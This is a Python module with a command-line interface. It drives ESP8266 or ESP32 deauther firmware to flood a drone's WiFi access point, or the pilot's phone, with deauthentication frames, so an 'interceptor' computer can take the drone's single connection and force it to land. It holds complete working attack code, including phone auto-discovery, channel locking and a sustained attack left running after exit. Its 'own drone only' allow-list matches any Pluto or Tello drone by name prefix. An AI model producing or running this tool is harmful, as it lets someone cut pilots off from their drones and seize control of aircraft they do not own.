"""ESP deauth driver — free YOUR OWN drone's WiFi slot (ESP32 or ESP8266).

SCOPE / LEGAL — read this first:
  * This drives an ESP running deauth firmware to transmit an 802.11
    **deauthentication** burst at **one allow-listed access point that you own**
    (your demo drone's AP) so the pilot's phone drops and the interceptor Pi can
    take the single client slot to send a LAND.
  * Deauthing a network you do NOT own is illegal in nearly every jurisdiction.
    This module therefore refuses to attack any AP whose SSID does not match the
    `authorized` allow-list (your `Pluto_*` / `TELLO-*` prefix). Broadcast /
    untargeted deauth is deliberately NOT the default — we select the one AP.
  * With no board attached (e.g. a Windows laptop) it runs in **mock** and only
    prints the CLI it *would* send, so import and __main__ run anywhere.

Two boards, two firmwares (pick with `firmware=` or $DEAUTH_FW):
  * "deauther"  -> ESP8266 running **Spacehuhn's ESP8266 Deauther 2.x** (default).
  * "marauder"  -> ESP32 running **Marauder** (S2/S3/C3/original ESP32).
  Both are 2.4 GHz, which is exactly what the Pluto/Tello AP uses. The only
  difference is the serial command words and the `show` output layout, captured
  in FIRMWARES below.

Why the ESP at all:
  The Pi/laptop radio can join a network but cannot cleanly transmit deauth
  frames. The Pluto/Tello AP is *first-connection-holds* — while the pilot's
  phone holds the one client slot, the Pi is refused. A short targeted deauth
  knocks the phone off; the Pi grabs the freed slot within a couple of seconds
  and commands LAND. That is the one radio job the ESP exists to do.

ESP8266 note: you need a Deauther 2.x build with the **serial CLI enabled**
(115200). Older/web-UI-only builds won't answer serial — in that case pass an
explicit `select_index=` (the drone AP is usually the strongest/only `Pluto_*`),
or drive the board over its own web AP instead of USB.

    d = DeauthESP32(authorized=["Pluto", "TELLO"])   # ESP8266 / deauther (default)
    d.run_targeted("Pluto_2025_2242", duration_s=6)   # scan->select->deauth->stop
"""
from __future__ import annotations
import os, sys, time, re

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

# Where the ESP usually enumerates. Override with $DEAUTH_PORT.
_CANDIDATE_PORTS = ["/dev/ttyUSB0", "/dev/ttyACM0", "/dev/ttyUSB1", "COM3", "COM4"]
_BAUD = int(os.environ.get("DEAUTH_BAUD", "115200"))

# Serial command dialects. `{idx}` is filled with the selected AP index.
FIRMWARES = {
    "marauder": {   # ESP32 — Marauder
        "scan": "scanap", "scan_stop": "stop", "list": "list -a",
        "select": "select -a {idx}", "attack": "attack -t deauth", "stop": "stop",
    },
    "deauther": {   # ESP8266 — Spacehuhn Deauther 2.x
        "scan": "scan ap", "scan_stop": "stop", "list": "show ap",
        "select": "select ap {idx}", "attack": "attack deauth", "stop": "stop",
        # station (client) targeting — lets us deauth ONLY the pilot's phone MAC
        # so the laptop can join the freed slot without being kicked too.
        "scan_station": "scan station", "list_station": "show station",
        "select_station": "select station {idx}",
    },
}

# Marauder's labelled AP line, e.g.
#   "0: SSID: Pluto_2025_2242 | BSSID: aa:bb:cc:dd:ee:ff | CH: 6 | RSSI: -41"
_AP_LINE = re.compile(
    r"(?P<idx>\d+)\s*[:).]?\s*.*?SSID[:=]?\s*(?P<ssid>.+?)\s*[|,]\s*"
    r"BSSID[:=]?\s*(?P<bssid>[0-9A-Fa-f:]{17})",
    re.IGNORECASE)
_MAC = re.compile(r"[0-9A-Fa-f:]{17}")
_LEAD_IDX = re.compile(r"^\s*\[?\s*(\d+)\s*\]?")   # leading index, bare or bracketed


class DeauthESP32:
    def __init__(self, port: str | None = None, baud: int = _BAUD,
                 authorized=None, force_mock: bool = False,
                 firmware: str | None = None):
        self.baud = int(baud)
        # Allow-list of YOUR OWN AP SSID substrings (case-insensitive).
        self.authorized = [str(a).upper() for a in (authorized or []) if str(a).strip()]
        self.force_mock = bool(force_mock)
        fw = (firmware or os.environ.get("DEAUTH_FW") or "deauther").lower()
        self.firmware = fw if fw in FIRMWARES else "deauther"
        self.cmd = FIRMWARES[self.firmware]
        self._ser = None
        self.port = port or os.environ.get("DEAUTH_PORT") or self._autodetect()
        if not self.force_mock:
            self._open()

    # ---- connection -----------------------------------------------------------
    @staticmethod
    def _autodetect() -> str | None:
        """Pick the first likely serial port (pyserial enumeration, then fallbacks)."""
        try:
            from serial.tools import list_ports
            for p in list_ports.comports():
                desc = f"{p.device} {p.description}".lower()
                if any(k in desc for k in ("cp210", "ch340", "esp", "usb", "acm", "uart")):
                    return p.device
        except Exception:
            pass
        for cand in _CANDIDATE_PORTS:
            if os.path.exists(cand):
                return cand
        return None

    def _open(self) -> None:
        if not self.port:
            return                                  # stays mock — nothing plugged in
        try:
            import serial                           # pyserial
            self._ser = serial.Serial(self.port, self.baud, timeout=1.5)
            time.sleep(1.0)                          # let the board settle after DTR reset
            self._ser.reset_input_buffer()
        except Exception as e:
            print(f"[deauth] serial open failed on {self.port} "
                  f"({type(e).__name__}: {e}); running mock")
            self._ser = None

    @property
    def mode(self) -> str:
        if self.force_mock or self._ser is None:
            return "mock"
        return "serial"

    # ---- low-level CLI --------------------------------------------------------
    def _send(self, cmd: str, settle: float = 0.4) -> str:
        """Write one CLI line; return whatever the board prints back."""
        if self._ser is None:
            print(f"[deauth] (mock) would send: {cmd}")
            return ""
        self._ser.write((cmd + "\n").encode("ascii", "ignore"))
        time.sleep(settle)
        try:
            data = self._ser.read(self._ser.in_waiting or 1)
            return data.decode("utf-8", "ignore")
        except Exception:
            return ""

    def _scan_raw(self, seconds: float) -> str:
        """Run scan -> stop -> list and return the raw AP-list text."""
        self._send(self.cmd["scan"])
        time.sleep(max(1.0, seconds))
        self._send(self.cmd["scan_stop"])
        return self._send(self.cmd["list"], settle=1.0)

    # ---- high-level actions ---------------------------------------------------
    def scan_aps(self, seconds: float = 6.0) -> list[dict]:
        """Run a scan and return parsed [{idx, ssid, bssid}] access points.

        Uses Marauder's labelled format when present; otherwise falls back to a
        generic 'leading index + first MAC' parse that also fits the ESP8266
        Deauther's columnar `show ap` output.
        """
        if self._ser is None:
            print(f"[deauth] (mock) would {self.cmd['scan']} for {seconds:.0f}s, "
                  f"then {self.cmd['list']}")
            return []
        aps = []
        for line in self._scan_raw(seconds).splitlines():
            m = _AP_LINE.search(line)
            if m:
                aps.append({"idx": int(m.group("idx")), "ssid": m.group("ssid").strip(),
                            "bssid": m.group("bssid").lower()})
                continue
            mi = _LEAD_IDX.match(line)
            if mi and (_MAC.search(line) or self.authorized):
                mb = _MAC.search(line)
                aps.append({"idx": int(mi.group(1)), "ssid": line.strip(),
                            "bssid": mb.group(0).lower() if mb else None})
        return aps

    def _is_authorized(self, ssid: str) -> bool:
        u = (ssid or "").upper()
        return bool(u) and any(a in u for a in self.authorized)

    def _index_for_ssid(self, seconds: float, ssid: str):
        """Scan, then return (index, bssid) of the line containing our SSID.

        Firmware-agnostic: we don't fully parse the table, we just find the AP
        row that mentions the target SSID and read its leading index — which is
        what both Marauder and the ESP8266 Deauther print first on each row.
        """
        raw = self._scan_raw(seconds)
        for line in raw.splitlines():
            if ssid.upper() in line.upper() and self._is_authorized(ssid):
                mi = _LEAD_IDX.match(line)
                if mi:
                    mb = _MAC.search(line)
                    return int(mi.group(1)), (mb.group(0).lower() if mb else None), raw
        return None, None, raw

    def run_targeted(self, ssid: str, duration_s: float = 6.0,
                     select_index: int | None = None, channel: int | None = None) -> dict:
        """Deauth exactly the AP whose SSID matches the allow-list. Never others.

        `channel` (the AP's channel) is set on the radio before attacking — deauth
        frames must go out on the target's channel or the client never hears them.

        Returns {"action": "deauth"|"none"|"error"|"mock", ...}.
        """
        if not self._is_authorized(ssid):
            return {"action": "none",
                    "reason": f"'{ssid}' not on deauth allow-list {self.authorized}"}

        # In mock we just narrate the sequence.
        if self._ser is None:
            print(f"[deauth] (mock/{self.firmware}) would deauth own AP '{ssid}' "
                  f"for {duration_s:.0f}s")
            return {"action": "mock", "target": ssid, "firmware": self.firmware,
                    "sent": False}

        try:
            idx, bssid, raw = select_index, None, ""
            if idx is None:
                # The AP list is flaky: a single short scan can miss a target on
                # a less-hopped channel even when it's the strongest AP. Retry a
                # few times (longer each round) before giving up.
                for scan_s in (8.0, 10.0, 12.0):
                    idx, bssid, raw = self._index_for_ssid(scan_s, ssid)
                    if idx is not None:
                        break
                    print(f"[deauth/{self.firmware}] '{ssid}' not in that scan; rescanning...")
                if idx is None:
                    n = len([l for l in raw.splitlines() if l.strip()])
                    return {"action": "none",
                            "reason": f"AP '{ssid}' not seen after 3 scans ({n} lines last). "
                                      f"Pass select_index= if the CLI list is empty."}

            if channel is None:
                channel = self._channel_for(raw, ssid)
            self._send(self.cmd["select"].format(idx=idx))
            if channel:
                self._send(f"set channel {int(channel)}")   # deauth must be on the AP's channel
            self._send(self.cmd["attack"])
            time.sleep(max(0.5, duration_s))
            self._send(self.cmd["stop"])
            print(f"[deauth/{self.firmware}] targeted own AP '{ssid}' (idx {idx}"
                  + (f", {bssid}" if bssid else "") + (f", ch {channel}" if channel else "")
                  + f") for {duration_s:.0f}s")
            return {"action": "deauth", "target": ssid, "firmware": self.firmware,
                    "index": idx, "bssid": bssid, "channel": channel,
                    "duration_s": duration_s, "sent": True}
        except Exception as e:
            return {"action": "error", "target": ssid, "reason":
                    f"{type(e).__name__}: {e}"}

    # ---- station (client) targeting -------------------------------------------
    def scan_stations(self, seconds: float = 10.0, ap_index: int | None = None,
                      channel: int | None = None) -> tuple[list[dict], str]:
        """Scan for CLIENTS (stations) and return ([{idx, mac, raw}], raw_text).

        The pilot's phone is a client of the drone AP. Deauthing that one MAC
        (instead of the whole AP) keeps the phone out while leaving the laptop
        free to grab the freed slot. Pass `channel` (the drone's channel) to LOCK
        the sniff there — the default all-channel hop rarely catches a phone that
        only appears on one channel. Only meaningful on the ESP8266 Deauther.
        """
        if self._ser is None:
            print(f"[deauth] (mock) would {self.cmd.get('scan_station','scan station')} "
                  f"for {seconds:.0f}s then {self.cmd.get('list_station','show station')}")
            return [], ""
        if ap_index is not None:
            self._send(self.cmd["select"].format(idx=ap_index))
        if channel:
            self._send(f"set channel {int(channel)}")   # lock the radio to the drone's channel
        scan_cmd = self.cmd.get("scan_station", "scan station")
        if channel:
            scan_cmd = f"{scan_cmd} -ch {int(channel)}"
        self._send(scan_cmd)
        time.sleep(max(3.0, seconds))
        self._send(self.cmd["scan_stop"])
        raw = self._send(self.cmd.get("list_station", "show station"), settle=1.2)
        stations = []
        for line in raw.splitlines():
            mi = _LEAD_IDX.match(line)
            mb = _MAC.search(line)
            if mi and mb:
                stations.append({"idx": int(mi.group(1)), "mac": mb.group(0).lower(),
                                 "raw": line.strip()})
        return stations, raw

    def find_phone_station(self, ssid: str, seconds: float = 10.0,
                           ap_index: int | None = None, channel: int | None = None):
        """Return (idx, mac, raw) of the client currently on the drone AP.

        The Deauther's `show station` prints the associated AP name on each row,
        so we pick the station row that mentions our SSID — robust to the phone's
        per-SSID MAC randomization (no need to know the MAC in advance).

        `channel` locks the sniff to the drone's channel (reliable capture). The
        sniff can still miss a briefly-idle phone, so we retry a few times.
        """
        raw = ""
        for scan_s in (seconds, seconds + 4, seconds + 8):
            _stations, raw = self.scan_stations(scan_s, ap_index=ap_index, channel=channel)
            for line in raw.splitlines():
                if ssid.upper() in line.upper():
                    mi = _LEAD_IDX.match(line)
                    mb = _MAC.search(line)
                    if mi and mb:
                        return int(mi.group(1)), mb.group(0).lower(), raw
            print(f"[deauth] no client on '{ssid}' that scan; rescanning"
                  + (f" (locked ch {channel})" if channel else " (all channels)") + "...")
        return None, None, raw

    @staticmethod
    def _channel_for(raw: str, ssid: str) -> int | None:
        """Pull the drone AP's channel out of the `show ap` list (e.g. '... 4  -49 WPA2')."""
        for line in (raw or "").splitlines():
            if ssid.upper() in line.upper():
                m = re.search(r"\s(\d{1,2})\s+-\d{1,3}\b", line)   # channel then RSSI
                if m:
                    return int(m.group(1))
        return None

    def start_station_deauth(self, station_index: int) -> dict:
        """Select ONE station index and start deauthing it — and LEAVE IT RUNNING.

        Fire-and-forget: the ESP keeps attacking after we close serial, so the
        caller can join the drone + LAND, then call stop()/`--stop` to end it.
        """
        if self._ser is None:
            print(f"[deauth] (mock) would deauth station idx {station_index} (sustained)")
            return {"action": "mock", "station_index": station_index, "sent": False}
        self._send(self.cmd.get("select_station", "select station {idx}").format(idx=station_index))
        self._send(self.cmd["attack"])
        print(f"[deauth/{self.firmware}] sustained deauth of station idx {station_index} "
              f"(running until --stop)")
        return {"action": "deauth-station", "station_index": station_index, "sent": True}

    def selftest(self) -> dict:
        """Report whether the board is reachable on serial — sends no attack.

        Useful before a demo: confirms the port opened and the firmware answers.
        """
        info = {"mode": self.mode, "firmware": self.firmware, "port": self.port}
        if self._ser is None:
            info["ok"] = False
            info["reason"] = ("no serial board (mock) — check cable / USB-serial "
                              "driver / dialout group / --port")
            return info
        resp = self._send(self.cmd["stop"], settle=0.6)   # harmless: stop any task
        info["ok"] = True
        info["responded"] = bool(resp.strip())
        info["sample"] = resp.strip()[:120]
        return info

    def stop(self) -> None:
        try:
            self._send(self.cmd["stop"])
        except Exception:
            pass

    def close(self, send_stop: bool = True) -> None:
        # send_stop=False is REQUIRED for a sustained/fire-and-forget attack:
        # otherwise we'd cancel the very deauth we just started as we exit.
        try:
            if send_stop:
                self.stop()
            if self._ser is not None:
                self._ser.close()
        except Exception:
            pass


# Board-agnostic alias — the class drives ESP32 (Marauder) or ESP8266 (Deauther).
DeauthRadio = DeauthESP32


def main(argv=None):
    import argparse, json
    p = argparse.ArgumentParser(
        description="ESP32/ESP8266 targeted deauth of YOUR OWN drone AP.")
    p.add_argument("--ssid", default="Pluto_2025_2242",
                   help="the OWN AP SSID to deauth (must match --authorized)")
    p.add_argument("--authorized", nargs="*", default=["PLUTO", "TELLO"],
                   help="allow-list SSID substrings identifying YOUR OWN AP(s)")
    p.add_argument("--firmware", choices=sorted(FIRMWARES), default=None,
                   help="deauther (ESP8266) or marauder (ESP32). Default $DEAUTH_FW/deauther")
    p.add_argument("--duration", type=float, default=6.0,
                   help="seconds to hold the deauth (default 6)")
    p.add_argument("--index", type=int, default=None,
                   help="skip scan; deauth this AP index directly (best for web-UI-only builds)")
    p.add_argument("--port", default=None, help="serial port (auto-detect if omitted)")
    p.add_argument("--selftest", action="store_true",
                   help="check the board answers on serial (sends no attack) and exit")
    # --- station (client-MAC) targeting, for the single-slot handoff ----------
    p.add_argument("--scan-stations", action="store_true",
                   help="scan the --ssid AP's CLIENTS (phone) and print their MACs, then exit")
    p.add_argument("--attack-station", type=int, default=None, metavar="IDX",
                   help="sustained deauth of this station index; LEAVES IT RUNNING (fire-and-forget)")
    p.add_argument("--station-mac", default=None,
                   help="sustained deauth of the client with this MAC (scans to find its index)")
    p.add_argument("--attack-phone", action="store_true",
                   help="auto-find the client on the --ssid drone AP and sustained-deauth it")
    p.add_argument("--channel", type=int, default=None,
                   help="lock the station sniff to this channel (else parsed from the AP scan)")
    p.add_argument("--stop", action="store_true",
                   help="send stop to the board (end a sustained attack) and exit")
    p.add_argument("--force-mock", action="store_true")
    args = p.parse_args(argv)

    d = DeauthESP32(port=args.port, authorized=args.authorized,
                    firmware=args.firmware, force_mock=args.force_mock)
    print(f"mode: {d.mode}  firmware: {d.firmware}  port: {d.port}")

    if args.stop:
        d.stop(); print(json.dumps({"action": "stop", "sent": d.mode == "serial"})); d.close(); return
    if args.selftest:
        print(json.dumps(d.selftest())); d.close(); return

    # Station targeting requires an allow-listed AP (we only touch OUR drone).
    if args.scan_stations or args.attack_station is not None or args.station_mac or args.attack_phone:
        if not d._is_authorized(args.ssid):
            print(json.dumps({"action": "none",
                              "reason": f"'{args.ssid}' not on allow-list {d.authorized}"}))
            d.close(); return
        ap_idx = args.index
        ap_raw = ""
        if ap_idx is None:
            ap_idx, _b, ap_raw = d._index_for_ssid(8.0, args.ssid)
        # channel to lock the station sniff to (explicit, else parsed from AP scan)
        chan = args.channel or d._channel_for(ap_raw, args.ssid)
        if chan:
            print(f"[deauth] locking station sniff to channel {chan}")
        if args.scan_stations:
            stations, raw = d.scan_stations(10.0, ap_index=ap_idx, channel=chan)
            print(json.dumps({"ap_index": ap_idx, "channel": chan, "stations": stations}, indent=2))
            print("---- raw ----\n" + raw)
            d.close(); return
        st_idx = args.attack_station
        if st_idx is None and args.attack_phone:   # auto-find the client on our AP
            st_idx, mac, _raw = d.find_phone_station(args.ssid, 10.0, ap_index=ap_idx, channel=chan)
            if st_idx is None:
                print(json.dumps({"action": "none",
                                  "reason": f"no client seen on '{args.ssid}' (is the phone connected?)"}))
                d.close(); return
            print(f"[deauth] auto-found phone {mac} on '{args.ssid}' at station idx {st_idx}")
        if st_idx is None and args.station_mac:
            stations, _raw = d.scan_stations(10.0, ap_index=ap_idx, channel=chan)
            want = args.station_mac.lower()
            match = next((s for s in stations if s["mac"] == want), None)
            st_idx = match["idx"] if match else None
            if st_idx is None:
                print(json.dumps({"action": "none",
                                  "reason": f"station {want} not seen; scanned {len(stations)}"}))
                d.close(); return
        print(json.dumps(d.start_station_deauth(st_idx)))
        d.close(send_stop=False)   # leave it RUNNING; end it later with --stop
        return

    print(json.dumps(d.run_targeted(args.ssid, args.duration, args.index, channel=args.channel)))
    # Refusal proof: an SSID that is not ours must be declined.
    print("other AP ->", json.dumps(d.run_targeted("Neighbour_5G", args.duration)))
    d.close()


if __name__ == "__main__":
    main()
